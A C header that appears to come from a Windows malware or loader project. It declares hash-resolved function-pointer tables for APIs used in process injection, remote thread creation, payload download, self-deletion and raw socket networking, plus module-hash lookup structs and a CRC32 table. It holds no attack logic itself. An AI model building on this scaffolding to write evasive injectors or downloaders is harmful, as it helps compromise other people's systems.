#pragma once
#include "kernel32_functions.h"
#include "kernel32_hash.h"

#include "user32_hash.h"
#include "user32_functions.h"

#include "ntdll_hash.h"
#include "ntdll_functions.h"

#include "wininet_hash.h"
#include "wininet_functions.h"

#include "shell32_hash.h"
#include "shell32_functions.h"

#include "advapi32_hash.h"
#include "advapi32_functions.h"

#include "urlmon_hash.h"
#include "urlmon_functions.h"

#include "winsock_hash.h"
#include "winsock_functions.h"

typedef struct
{
	ptVirtualAlloc pVirtualAlloc;
	ptVirtualFree pVirtualFree;
	ptOpenProcess pOpenProcess;
	ptVirtualAllocEx pVirtualAllocEx;
	ptVirtualFreeEx pVirtualFreeEx;
	ptWriteProcessMemory pWriteProcessMemory;
	ptCreateRemoteThread pCreateRemoteThread;
	ptCloseHandle pCloseHandle;
	ptCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;
	ptCreateProcessW pCreateProcessW;
	ptVirtualProtect pVirtualProtect;
	ptProcess32FirstW pProcess32FirstW;
	ptProcess32NextW pProcess32NextW;
	ptExitProcess pExitProcess;
	ptGetModuleFileNameW pGetModuleFileNameW;
	ptDeleteFileW pDeleteFileW;
	ptSleep pSleep;
	ptLoadLibraryW pLoadLibraryW;
	ptIsWow64Process pIsWow64Process;
	ptGetCurrentProcessId pGetCurrentProcessId;
	ptGetWindowsDirectoryW pGetWindowsDirectoryW;
	ptQueueUserAPC pQueueUserAPC;
	ptResumeThread pResumeThread;
	ptGetSystemDirectoryW pGetSystemDirectoryW;
	ptFindFirstFileW pFindFirstFileW;
	ptFindNextFileW pFindNextFileW;
	ptCreateThread pCreateThread;
	ptCreateFileW pCreateFileW;
	ptWriteFile pWriteFile;
	ptReadFile pReadFile;
	ptGetFileSize pGetFileSize;
	ptGetVersionExW pGetVersionExW;
	ptFindFirstVolumeW pFindFirstVolumeW;
	ptGetVolumeInformationW pGetVolumeInformationW;
	ptFindVolumeClose pFindVolumeClose;
	ptMultiByteToWideChar pMultiByteToWideChar;
	ptGetModuleHandleW pGetModuleHandleW;
	ptFlushInstructionCache pFlushInstructionCache;
	ptGetProcessHeap pGetProcessHeap;
	ptHeapAlloc pHeapAlloc;
	ptHeapFree pHeapFree;
	ptGetCurrentProcess pGetCurrentProcess;
	ptThread32First pThread32First;
	ptThread32Next pThread32Next;
	ptOpenMutexW pOpenMutexW;
	ptCreateMutexW pCreateMutexW;
	ptVirtualQuery pVirtualQuery;
	ptCreateFileMappingW pCreateFileMappingW;
	ptMapViewOfFile pMapViewOfFile;
	ptUnmapViewOfFile pUnmapViewOfFile;
	ptDuplicateHandle pDuplicateHandle;
	ptGetCurrentThread pGetCurrentThread;

	ptwsprintfW pwsprintfW;
	ptwsprintfA pwsprintfA;
	ptGetCursorPos pGetCursorPos;

	ptInternetOpenW pInternetOpenW;
	ptInternetConnectA pInternetConnectA;
	ptHttpOpenRequestA pHttpOpenRequestA;
	ptHttpSendRequestA pHttpSendRequestA;
	ptInternetCloseHandle pInternetCloseHandle;
	ptInternetReadFile pInternetReadFile;

	ptSHGetFolderPathW pSHGetFolderPathW;

	ptGetUserNameA pGetUserNameA;

	ptURLDownloadToFileW pURLDownloadToFileW;
	
	ptRtlRandomEx pRtlRandomEx;
	ptNtCreateThread pNtCreateThread;
	ptNtQueryInformationProcess pNtQueryInformationProcess;
	ptNtCreateUserProcess pNtCreateUserProcess;
	ptNtMapViewOfSection pNtMapViewOfSection;
	ptLdrLoadDll pLdrLoadDll;
	ptLdrGetDllHandle pLdrGetDllHandle;
	ptNtWriteVirtualMemory pNtWriteVirtualMemory;
	ptNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	ptNtProtectVirtualMemory pNtProtectVirtualMemory;
	ptNtDeviceIoControlFile pNtDeviceIoControlFile;
	ptNtSetContextThread pNtSetContextThread;
	ptNtOpenProcess pNtOpenProcess;
	ptNtClose pNtClose;
	ptNtCreateFile pNtCreateFile;

	ptWSAStartup pWSAStartup;
	ptWSACleanup pWSACleanup;
	ptsocket psocket;
	ptconnect pconnect;
	ptsend psend;
	ptrecv precv;
	ptclosesocket pclosesocket;

} apis_t;

typedef struct
{
	HMODULE hKernel32, hNtdll, hUser32, hWininet, hShell32, hAdvapi32, hUrlmon, hWs2_32;
} modules_t;

typedef struct
{
	DWORD dwModuleHash;
	HMODULE* pModule;
} module_t;

typedef struct
{
	DWORD dwFunctionHash;
	HMODULE* pModule;
	LPVOID* pFunction;
} api_t;

typedef struct
{
	DWORD crc32table[256];
	BOOL crc32Intalized;
}crc_t;